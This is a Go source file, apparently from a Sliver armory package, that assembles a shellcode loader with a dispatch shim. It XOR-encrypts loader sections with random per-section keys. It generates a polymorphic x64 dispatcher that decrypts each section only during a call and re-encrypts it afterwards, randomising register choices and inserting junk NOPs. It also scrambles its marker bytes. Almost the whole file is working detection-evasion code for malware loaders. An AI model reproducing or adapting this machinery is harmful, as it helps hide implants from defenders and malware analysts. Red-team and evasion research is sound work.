package churro

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"strings"

	"github.com/sliverarmory/churro/internal/assets"
)

const (
	dispatchSlotSize  = 384
	dispatchThunkSize = 17
	shimMaxFunctions  = 16
)

func residentLoaderFunction(fn LoaderFunction) bool {
	// The shim calls .text directly. Every other section, including the hash
	// resolver, uses the dispatcher's synchronized decrypt/call/encrypt path.
	return strings.HasPrefix(fn.Name, ".text")
}

func embeddedLoaderMetadata(second bool) (LoaderMetadata, error) {
	var raw []byte
	if second {
		raw = assets.LoaderPEB2Metadata
	} else {
		raw = assets.LoaderPEB1Metadata
	}
	var meta LoaderMetadata
	if err := json.Unmarshal(raw, &meta); err != nil {
		return LoaderMetadata{}, fmt.Errorf("parse embedded loader metadata: %w", err)
	}
	return meta, nil
}

// prepareCombinedWithMetadata uses the section table produced by exe2h.
// With one section, the shim decrypts the complete loader once. With multiple
// sections, .text stays resident and references into other sections pass
// through a dispatcher that decrypts the callee for the duration of its call.
func prepareCombinedWithMetadata(loaderImage, shimImage []byte, meta LoaderMetadata, entropy io.Reader) ([]byte, error) {
	return prepareCombinedWithMetadataContext(context.Background(), loaderImage, shimImage, meta, entropy)
}

func prepareCombinedWithMetadataContext(ctx context.Context, loaderImage, shimImage []byte, meta LoaderMetadata, entropy io.Reader) ([]byte, error) {
	if err := ctx.Err(); err != nil {
		return nil, err
	}
	if err := validateLoaderMetadata(meta, loaderImage); err != nil {
		return nil, fmt.Errorf("loader metadata: %w", err)
	}
	if len(meta.Functions) == 1 {
		return prepareCombinedContext(ctx, loaderImage, shimImage, entropy)
	}
	if len(meta.Functions)+1 > shimMaxFunctions {
		return nil, fmt.Errorf("%d loader sections exceed the dispatch table capacity", len(meta.Functions))
	}
	if len(shimImage) < 16 || entropy == nil {
		return nil, fmt.Errorf("missing dispatch shim or entropy source")
	}
	if meta.Functions[0].Name != ".text" {
		return nil, fmt.Errorf("the loader entry section must be resident .text")
	}

	resident := make([]bool, len(meta.Functions))
	for i, fn := range meta.Functions {
		resident[i] = residentLoaderFunction(fn)
	}
	protectedRefs := 0
	for i, ref := range meta.References {
		if i&1023 == 0 {
			if err := ctx.Err(); err != nil {
				return nil, err
			}
		}
		if !resident[ref.TargetFn] {
			// The thunk tail-jumps into a dispatcher that CALLs the callee
			// and then returns to the original CALL's return address.
			// RIP-relative data, jumps, and conditional branches need
			// different semantics and cannot use this path.
			if ref.InstLength != 5 || ref.DispOffset != 1 || loaderImage[ref.SrcBlobOff] != 0xe8 {
				return nil, fmt.Errorf("reference %d into protected section is not CALL rel32", i)
			}
			protectedRefs++
		}
	}
	var choices [2]byte
	if _, err := io.ReadFull(entropy, choices[:]); err != nil {
		return nil, fmt.Errorf("select dispatch layout: %w", err)
	}
	prePad := int(choices[0] & 63)
	inputSwap := choices[1]&1 != 0
	shimPadded := (len(shimImage) + 4095) &^ 4095
	tailSize := prePad + dispatchSlotSize + protectedRefs*dispatchThunkSize
	if len(loaderImage) > math.MaxInt32-shimPadded-tailSize {
		return nil, fmt.Errorf("combined loader exceeds size limit")
	}
	combined := make([]byte, shimPadded+len(loaderImage)+tailSize)
	copy(combined, shimImage)
	if _, err := io.ReadFull(entropy, combined[len(shimImage):shimPadded]); err != nil {
		return nil, fmt.Errorf("generate shim padding: %w", err)
	}
	copy(combined[shimPadded:], loaderImage)
	if _, err := io.ReadFull(entropy, combined[shimPadded+len(loaderImage):]); err != nil {
		return nil, fmt.Errorf("generate dispatch padding: %w", err)
	}
	// Include the dispatcher tail in the shim's page protection and wipe
	// range. The function table still starts the resident tail at the end
	// of the original loader image.
	if err := patchShimBounds(combined[:len(shimImage)], uint32(shimPadded), uint32(len(loaderImage)+tailSize)); err != nil {
		return nil, err
	}
	marker := []byte{0xb1, 0x7a, 0x7e, 0xf1, 0xb1, 0x7a, 0x7e, 0xf1}
	ft := bytes.Index(combined[:len(shimImage)], marker)
	if ft < 0 || ft+16+(len(meta.Functions)+1)*12 > len(shimImage) {
		return nil, fmt.Errorf("dispatch shim function table is missing or too small")
	}
	if ft&1 != 0 {
		return nil, fmt.Errorf("dispatch shim function table state is not 2-byte aligned")
	}
	if bytes.Index(combined[ft+1:len(shimImage)], marker) >= 0 {
		return nil, fmt.Errorf("dispatch shim function table marker is ambiguous")
	}

	dispatchOff := shimPadded + len(loaderImage) + prePad
	dispatcher, err := emitNativeDispatcher(uint32(dispatchOff), uint32(shimPadded), uint32(ft), inputSwap, entropy)
	if err != nil {
		return nil, err
	}
	if len(dispatcher) > dispatchSlotSize {
		return nil, fmt.Errorf("dispatch code exceeds reserved slot: %d", len(dispatcher))
	}
	copy(combined[dispatchOff:], dispatcher)
	thunkNum := 0
	for i, ref := range meta.References {
		if i&1023 == 0 {
			if err := ctx.Err(); err != nil {
				return nil, err
			}
		}
		if resident[ref.TargetFn] {
			continue
		}
		srcDisp := int(ref.SrcBlobOff) + int(ref.DispOffset)
		oldRel := int32(binary.LittleEndian.Uint32(combined[shimPadded+srcDisp : shimPadded+srcDisp+4]))
		target := int64(ref.SrcBlobOff) + int64(ref.InstLength) + int64(oldRel)
		callee := meta.Functions[ref.TargetFn]
		if target < int64(callee.Offset) || target >= int64(callee.Offset)+int64(callee.Size) {
			return nil, fmt.Errorf("reference %d resolves outside target section %q", i, callee.Name)
		}
		thunkOff := dispatchOff + dispatchSlotSize + thunkNum*dispatchThunkSize
		fromThunkEnd := int64(thunkOff + dispatchThunkSize)
		toDispatcher := int64(dispatchOff) - fromThunkEnd
		newRel := int64(thunkOff-shimPadded) - int64(ref.SrcBlobOff) - int64(ref.InstLength)
		if toDispatcher < math.MinInt32 || toDispatcher > math.MaxInt32 || newRel < math.MinInt32 || newRel > math.MaxInt32 {
			return nil, fmt.Errorf("reference %d is out of rel32 range", i)
		}
		var order [1]byte
		if _, err := io.ReadFull(entropy, order[:]); err != nil {
			return nil, fmt.Errorf("select thunk order: %w", err)
		}
		thunk := emitNativeThunk(uint32(target), uint32(ref.TargetFn), int32(toDispatcher), inputSwap, order[0]&1 != 0)
		copy(combined[thunkOff:thunkOff+dispatchThunkSize], thunk)
		binary.LittleEndian.PutUint32(combined[shimPadded+srcDisp:shimPadded+srcDisp+4], uint32(int32(newRel)))
		thunkNum++
	}
	binary.LittleEndian.PutUint32(combined[ft+8:ft+12], uint32(len(meta.Functions)+1))
	for i, fn := range meta.Functions {
		entry := combined[ft+16+i*12 : ft+16+(i+1)*12]
		binary.LittleEndian.PutUint32(entry[:4], fn.Offset)
		binary.LittleEndian.PutUint32(entry[4:8], fn.Size)
		entry[8], entry[9], entry[10], entry[11] = 0, 1, 0, 0
		if !resident[i] {
			var key [1]byte
			for key[0] == 0 {
				if _, err := io.ReadFull(entropy, key[:]); err != nil {
					return nil, fmt.Errorf("generate function key: %w", err)
				}
			}
			entry[8], entry[9] = key[0], 0
			for j := fn.Offset; j < fn.Offset+fn.Size; j++ {
				if (j-fn.Offset)&4095 == 0 {
					if err := ctx.Err(); err != nil {
						return nil, err
					}
				}
				combined[shimPadded+int(j)] ^= key[0]
			}
		}
	}
	tail := combined[ft+16+len(meta.Functions)*12 : ft+16+(len(meta.Functions)+1)*12]
	binary.LittleEndian.PutUint32(tail[:4], uint32(len(loaderImage)))
	binary.LittleEndian.PutUint32(tail[4:8], uint32(tailSize))
	tail[8], tail[9], tail[10], tail[11] = 0, 1, 0, 0
	if _, err := io.ReadFull(entropy, combined[ft:ft+8]); err != nil {
		return nil, fmt.Errorf("scramble function table marker: %w", err)
	}
	if err := ctx.Err(); err != nil {
		return nil, err
	}
	return combined, nil
}

func patchShimBounds(shim []byte, offset, size uint32) error {
	patchedOffset, patchedSize := false, false
	for i := 0; i+4 <= len(shim); i++ {
		switch binary.LittleEndian.Uint32(shim[i : i+4]) {
		case 0xDEAD0001:
			if !patchedOffset {
				binary.LittleEndian.PutUint32(shim[i:i+4], offset)
				patchedOffset = true
			}
		case 0xDEAD0002:
			if !patchedSize {
				binary.LittleEndian.PutUint32(shim[i:i+4], size)
				patchedSize = true
			}
		}
	}
	if !patchedOffset || !patchedSize {
		return fmt.Errorf("dispatch shim sentinels are missing")
	}
	return nil
}

func emitNativeThunk(targetOff, fnID uint32, dispatcherRel int32, swapped, reverseOrder bool) []byte {
	targetOp, idOp := byte(0xba), byte(0xbb) // mov r10d/r11d, imm32
	if swapped {
		targetOp, idOp = idOp, targetOp
	}
	thunk := make([]byte, 0, dispatchThunkSize)
	putMov := func(op byte, imm uint32) {
		thunk = append(thunk, 0x41, op)
		thunk = binary.LittleEndian.AppendUint32(thunk, imm)
	}
	if reverseOrder {
		putMov(idOp, fnID)
		putMov(targetOp, targetOff)
	} else {
		putMov(targetOp, targetOff)
		putMov(idOp, fnID)
	}
	thunk = append(thunk, 0xe9)
	return binary.LittleEndian.AppendUint32(thunk, uint32(dispatcherRel))
}

// nativeDispatchEmitter writes x64 instructions while keeping entropy and
// RIP-relative offsets tied to the final instruction positions.
type nativeDispatchEmitter struct {
	code       []byte
	entropy    io.Reader
	err        error
	selfOff    uint32
	junkBudget int
}

func (e *nativeDispatchEmitter) put(v ...byte) { e.code = append(e.code, v...) }

func (e *nativeDispatchEmitter) randomByte() byte {
	if e.err != nil {
		return 0
	}
	var value [1]byte
	_, e.err = io.ReadFull(e.entropy, value[:])
	return value[0]
}

func (e *nativeDispatchEmitter) rip(target uint32) {
	rel := int64(target) - int64(e.selfOff) - int64(len(e.code)) - 4
	e.code = binary.LittleEndian.AppendUint32(e.code, uint32(int32(rel)))
}

// junk inserts 0..4 bytes from the x86 multi-byte NOP family. These NOPs do
// not alter registers or flags, including at the gap before a loop JNZ.
func (e *nativeDispatchEmitter) junk() { e.junkChoice(e.randomByte()) }

func (e *nativeDispatchEmitter) junkChoice(choice byte) {
	if choice&1 == 0 {
		return
	}
	length := 1 + int((choice>>1)&3)
	if length > e.junkBudget {
		return
	}
	e.junkBudget -= length
	switch length {
	case 1:
		e.put(0x90)
	case 2:
		e.put(0x66, 0x90)
	case 3:
		if choice&0x10 != 0 {
			e.put(0x0f, 0x1f, 0xc0)
		} else {
			e.put(0x0f, 0x1f, 0x00)
		}
	case 4:
		e.put(0x0f, 0x1f, 0x40, choice)
	}
}

func (e *nativeDispatchEmitter) push(reg byte) {
	if reg < 8 {
		e.put(0x50 + reg)
	} else {
		e.put(0x41, 0x50+reg-8)
	}
}

func (e *nativeDispatchEmitter) pop(reg byte) {
	if reg < 8 {
		e.put(0x58 + reg)
	} else {
		e.put(0x41, 0x58+reg-8)
	}
}

// The selected state registers are r12..r15. Mod=01 with disp8=0 avoids the
// RIP-relative encoding for r13; r12 as a base requires an explicit SIB.
func (e *nativeDispatchEmitter) stateLoad(dst, base, disp byte, zeroExtend bool) {
	e.put(0x45)
	if zeroExtend {
		e.put(0x0f, 0xb6)
	} else {
		e.put(0x8b)
	}
	e.stateAddr(dst, base, disp)
}

// stateAddr encodes mod=01, disp8 memory access through r12..r15. r12
// requires a SIB byte; r13 must use disp8 even at offset zero.
func (e *nativeDispatchEmitter) stateAddr(reg, base, disp byte) {
	if base&7 == 4 {
		e.put(0x40|(reg&7)<<3|4, 0x24, disp)
	} else {
		e.put(0x40|(reg&7)<<3|(base&7), disp)
	}
}

func (e *nativeDispatchEmitter) stateBit(base byte, clear bool) {
	// LOCK BTS/BTR bit 15 of the aligned 16-bit FN_ENTRY._pad. The high bit
	// is the transition lock; the low 15 bits count active section calls.
	group := byte(5) // BTS: acquire
	if clear {
		group = 6 // BTR: release
	}
	e.put(0x66, 0xf0, 0x41, 0x0f, 0xba)
	e.stateAddr(group, base, 10)
	e.put(15)
}

func (e *nativeDispatchEmitter) stateCompare(base byte, value uint16) {
	// CMP word ptr [base+10], imm16.
	e.put(0x66, 0x41, 0x81)
	e.stateAddr(7, base, 10)
	e.code = binary.LittleEndian.AppendUint16(e.code, value)
}

func (e *nativeDispatchEmitter) stateCount(base byte, decrement bool) {
	group := byte(0) // INC word ptr [base+10]
	if decrement {
		group = 1 // DEC word ptr [base+10]
	}
	e.put(0x66, 0x41, 0xff)
	e.stateAddr(group, base, 10)
}

func (e *nativeDispatchEmitter) shortJump(op byte, target int) {
	rel := target - len(e.code) - 2
	if rel < -128 || rel > 127 {
		e.err = fmt.Errorf("dispatcher branch exceeds rel8 range")
		return
	}
	e.put(op, byte(int8(rel)))
}

func (e *nativeDispatchEmitter) pendingShortJump(op byte) int {
	e.put(op, 0)
	return len(e.code) - 1
}

func (e *nativeDispatchEmitter) resolveShortJump(displacementAt int) {
	rel := len(e.code) - displacementAt - 1
	if rel < -128 || rel > 127 {
		e.err = fmt.Errorf("dispatcher branch exceeds rel8 range")
		return
	}
	e.code[displacementAt] = byte(int8(rel))
}

func (e *nativeDispatchEmitter) acquireState(base byte) int {
	spin := len(e.code)
	e.put(0xf3, 0x90) // PAUSE during contention.
	e.stateBit(base, false)
	gotLock := e.pendingShortJump(0x73) // JNC: BTS saw an unlocked entry.
	e.shortJump(0xeb, spin)
	e.resolveShortJump(gotLock)
	return spin
}

// xorLoop toggles one protected section. Each invocation chooses its own
// helper register, traversal direction, loop terminator, and NOP gaps.
func (e *nativeDispatchEmitter) xorLoop(sizeReg, keyReg byte) {
	helperRegs := [...]byte{1, 2, 3, 6, 8, 9} // rcx, rdx, rbx, rsi, r8, r9
	helper := helperRegs[e.randomByte()%byte(len(helperRegs))]
	reverse := e.randomByte()&1 != 0
	addressLimit := e.randomByte()&1 != 0
	var gap [4]byte
	for i := range gap {
		gap[i] = e.randomByte()
	}
	helperLow, sizeLow, keyLow := helper&7, sizeReg&7, keyReg&7
	helperHigh := byte(0)
	if helper >= 8 {
		helperHigh = 1
	}

	if addressLimit && reverse {
		// limit = base - 1, before RAX is moved to the final byte.
		e.put(0x48|(helperHigh<<2), 0x8d, 0x40|(helperLow<<3), 0xff)
	}
	if reverse {
		// RAX = base + size - 1.
		e.put(0x4c, 0x01, 0xc0|(sizeLow<<3), 0x48, 0xff, 0xc8)
	}
	if addressLimit && !reverse {
		// limit = base + size (REX.X extends the SIB index to r12..r15).
		e.put(0x4a|(helperHigh<<2), 0x8d, 0x04|(helperLow<<3), sizeLow<<3)
	}
	if !addressLimit {
		// Counter starts at size and decrements once for each XOR.
		e.put(0x44|helperHigh, 0x89, 0xc0|(sizeLow<<3)|helperLow)
	}

	e.junkChoice(gap[0])
	top := len(e.code)
	e.put(0x44, 0x30, keyLow<<3) // XOR byte [RAX], keyRegB
	e.junkChoice(gap[1])
	if reverse {
		e.put(0x48, 0xff, 0xc8)
	} else {
		e.put(0x48, 0xff, 0xc0)
	}
	e.junkChoice(gap[2])
	if addressLimit {
		e.put(0x48|(helperHigh<<2), 0x39, 0xc0|(helperLow<<3)) // CMP RAX, helper
	} else {
		if helperHigh != 0 {
			e.put(0x41)
		}
		e.put(0xff, 0xc8|helperLow) // DEC helper
	}
	e.junkChoice(gap[3])
	rel := top - len(e.code) - 2
	if rel < -128 || rel > 127 {
		e.err = fmt.Errorf("dispatcher XOR loop exceeds rel8 range")
		return
	}
	e.put(0x75, byte(int8(rel)))
}

// emitNativeDispatcher preserves Microsoft x64 argument/nonvolatile registers.
// The four state roles and seven saved-register positions vary per output.
func emitNativeDispatcher(selfOff, loaderOff, ftOff uint32, swapped bool, entropy io.Reader) ([]byte, error) {
	if entropy == nil {
		return nil, fmt.Errorf("missing dispatcher entropy source")
	}
	e := nativeDispatchEmitter{code: make([]byte, 0, dispatchSlotSize), entropy: entropy, selfOff: selfOff, junkBudget: 40}
	roles := [4]byte{12, 13, 14, 15} // table pointer, offset, size, key
	for i := len(roles) - 1; i > 0; i-- {
		j := int(e.randomByte()) % (i + 1)
		roles[i], roles[j] = roles[j], roles[i]
	}
	ptr, off, size, key := roles[0], roles[1], roles[2], roles[3]
	ptrLow, offLow := ptr&7, off&7
	saveOrder := [7]byte{3, 6, 7, 12, 13, 14, 15}
	for i := len(saveOrder) - 1; i > 0; i-- {
		j := int(e.randomByte()) % (i + 1)
		saveOrder[i], saveOrder[j] = saveOrder[j], saveOrder[i]
	}
	// Seven pushes take entry RSP from 8 mod 16 to 0 mod 16. The frame
	// reserves 32-byte shadow space and spills the four register arguments.
	for i, reg := range saveOrder {
		e.push(reg)
		if i < len(saveOrder)-1 {
			e.junk()
		}
	}
	e.put(0x48, 0x83, 0xec, 0x60)
	e.put(0x48, 0x89, 0x4c, 0x24, 0x20) // save RCX
	e.junk()
	e.put(0x48, 0x89, 0x54, 0x24, 0x28) // save RDX
	e.junk()
	e.put(0x4c, 0x89, 0x44, 0x24, 0x30) // save R8
	e.junk()
	e.put(0x4c, 0x89, 0x4c, 0x24, 0x38) // save R9
	e.put(0x48, 0x8d, 0x35)
	e.rip(ftOff)
	e.put(0x48, 0x83, 0xc6, 0x10) // RSI = first table entry
	e.junk()
	idSrc := byte(3)     // r11d
	targetSrc := byte(2) // r10
	if swapped {
		idSrc, targetSrc = targetSrc, idSrc
	}
	e.put(0x45, 0x89, 0xc0|(idSrc<<3)|ptrLow) // PTR_d = function ID
	e.junk()
	e.put(0x4d, 0x6b, 0xc0|(ptrLow<<3)|ptrLow, 0x0c) // PTR *= 12
	e.junk()
	e.put(0x49, 0x01, 0xc0|(6<<3)|ptrLow) // PTR += RSI
	e.junk()
	e.stateLoad(off, ptr, 0, false)
	e.junk()
	e.stateLoad(size, ptr, 4, false)
	e.junk()
	e.stateLoad(key, ptr, 8, true)
	e.junk()
	// The table entry must survive the callee call. The shim reads flags
	// before loader entry; its two reserved bytes are exclusively owned by
	// the dispatcher while the loader runs.
	e.put(0x4c, 0x89, 0x44|(ptrLow<<3), 0x24, 0x48) // [rsp+0x48] = table entry
	e.put(0x48, 0x8d, 0x05)
	e.rip(loaderOff) // RAX = loader base
	e.junk()
	e.put(0x4c, 0x01, 0xc0|(offLow<<3)) // RAX += section offset
	e.put(0x48, 0x89, 0xc7)             // RDI = section base
	spin := e.acquireState(ptr)
	// If 32,767 calls are already active, release and wait for a return
	// instead of overflowing the 15-bit count and encrypting live code.
	e.stateCompare(ptr, 0xffff)
	hasCapacity := e.pendingShortJump(0x75) // JNE
	e.stateBit(ptr, true)
	e.shortJump(0xeb, spin)
	e.resolveShortJump(hasCapacity)
	e.stateCompare(ptr, 0x8000)              // lock held, count zero
	alreadyPlain := e.pendingShortJump(0x75) // JNE
	e.xorLoop(size, key)                     // first entrant decrypts under the transition lock
	e.resolveShortJump(alreadyPlain)
	e.stateCount(ptr, false)
	e.stateBit(ptr, true)
	e.put(0x4c, 0x8d, 0x05|(ptrLow<<3)) // PTR = loader base
	e.rip(loaderOff)
	e.put(0x48, 0x8b, 0x4c, 0x24, 0x20) // restore RCX
	e.junk()
	e.put(0x48, 0x8b, 0x54, 0x24, 0x28) // restore RDX
	e.junk()
	e.put(0x4c, 0x8b, 0x44, 0x24, 0x30) // restore R8
	e.junk()
	e.put(0x4c, 0x8b, 0x4c, 0x24, 0x38) // restore R9
	e.junk()
	e.put(0x4c, 0x89, 0xc0|(ptrLow<<3)) // RAX = loader base
	e.junk()
	e.put(0x4c, 0x01, 0xc0|(targetSrc<<3)) // RAX += target offset
	e.junk()
	e.put(0xff, 0xd0)                               // call RAX
	e.put(0x48, 0x89, 0x44, 0x24, 0x40)             // save return value
	e.put(0x4c, 0x8b, 0x44|(ptrLow<<3), 0x24, 0x48) // PTR = table entry
	e.acquireState(ptr)
	e.stateCount(ptr, true)
	e.stateCompare(ptr, 0x8000)             // lock held, count zero
	stillActive := e.pendingShortJump(0x75) // JNE
	e.put(0x48, 0x89, 0xf8)                 // RAX = section base
	e.xorLoop(size, key)                    // final return re-encrypts under the lock
	e.resolveShortJump(stillActive)
	e.stateBit(ptr, true)
	e.put(0x48, 0x8b, 0x44, 0x24, 0x40) // restore return value
	e.put(0x48, 0x83, 0xc4, 0x60)
	for i := len(saveOrder) - 1; i >= 0; i-- {
		e.pop(saveOrder[i])
		if i > 0 {
			e.junk()
		}
	}
	e.put(0xc3)
	if e.err != nil {
		return nil, fmt.Errorf("emit dispatcher: %w", e.err)
	}
	if len(e.code) > dispatchSlotSize {
		return nil, fmt.Errorf("dispatch code exceeds reserved slot: %d", len(e.code))
	}
	return e.code, nil
}
